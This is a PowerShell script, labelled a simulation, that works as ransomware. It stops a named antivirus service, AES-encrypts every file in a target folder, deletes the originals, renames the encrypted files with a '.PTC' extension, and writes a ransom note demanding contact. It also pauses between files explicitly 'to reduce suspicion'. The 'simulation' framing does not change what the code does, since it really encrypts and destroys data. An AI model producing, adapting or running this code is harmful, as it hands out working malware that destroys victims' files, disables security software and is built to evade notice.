# Function to generate a random key and IV for AES encryption
function Generate-AesKeyAndIv {
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.KeySize = 256  # Choose 128, 192, or 256 for AES key size

    $aes.GenerateKey()
    $aes.GenerateIV()

    [PSCustomObject]@{
        Key = $aes.Key
        IV = $aes.IV
    }
}

# Function to encrypt a file using AES
function Encrypt-File {
    param (
        [byte[]]$key,
        [byte[]]$iv,
        [string]$filePath
    )

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $key
    $aes.IV = $iv

    $encryptor = $aes.CreateEncryptor()

    $tempFilePath = "$filePath.temp"

    try {
        $inputStream = [System.IO.File]::OpenRead($filePath)
        $outputStream = [System.IO.File]::OpenWrite($tempFilePath)

        $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($outputStream, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)

        $buffer = New-Object byte[] 4096
        $bytesRead = 0
        while (($bytesRead = $inputStream.Read($buffer, 0, $buffer.Length)) -gt 0) {
            $cryptoStream.Write($buffer, 0, $bytesRead)
        }

        $cryptoStream.FlushFinalBlock()
    }
    finally {
        $inputStream.Close()
        $cryptoStream.Close()
        $outputStream.Close()
    }

    # Remove the original file and rename the encrypted file
    Remove-Item -Path $filePath
    Rename-Item -Path $tempFilePath -NewName ($filePath + ".PTC")

    # Log the operation
    Write-Output "Encrypted and renamed: $filePath to $($filePath + '.PTC')"
}

# Function to create a ransom note
function Create-RansomNote {
    param (
        [string]$folderPath
    )

    $notePath = Join-Path -Path $folderPath -ChildPath "README_FOR_DECRYPTION.txt"
    $noteContent = @"
YOUR FILES HAVE BEEN ENCRYPTED!

To restore your files, please contact us at: support@example.com

DO NOT attempt to remove this file or decrypt it on your own. All attempts to do so may result in permanent loss of your data.

Thank you.
"@
    
    Set-Content -Path $notePath -Value $noteContent
    Write-Output "Ransom note created: $notePath"
}

# Function to stop an antivirus service (simulated)
function Stop-AntivirusService {
    param (
        [string]$serviceName
    )

    try {
        Stop-Service -Name $serviceName -Force
        Write-Output "Stopped service: $serviceName"
    } catch {
        Write-Output "Failed to stop service: $serviceName. Error: $_"
    }
}

# Simulated stop for an antivirus service
# NOTE: Replace 'YourAntivirusServiceName' with an actual service name if testing in a controlled environment
Stop-AntivirusService -serviceName 'YourAntivirusServiceName'

# Generate AES key and IV
$keyAndIv = Generate-AesKeyAndIv
$key = $keyAndIv.Key
$iv = $keyAndIv.IV

# Output the generated key and IV
Write-Output "Generated AES Key: $([BitConverter]::ToString($key) -replace '-','')"
Write-Output "Generated AES IV: $([BitConverter]::ToString($iv) -replace '-','')"

# Get all files in the current directory
$folderPath = "C:\Path\To\Target"  # Update this path to the folder you want to target
$files = Get-ChildItem -Path $folderPath -File

foreach ($file in $files) {
    $filePath = $file.FullName
    
    # Encrypt each file with a delay between operations
    Encrypt-File -key $key -iv $iv -filePath $filePath
    Start-Sleep -Seconds 1  # Introduce a delay to reduce suspicion
}

# Create a ransom note in the target directory
Create-RansomNote -folderPath $folderPath

Write-Output "Simulation complete."
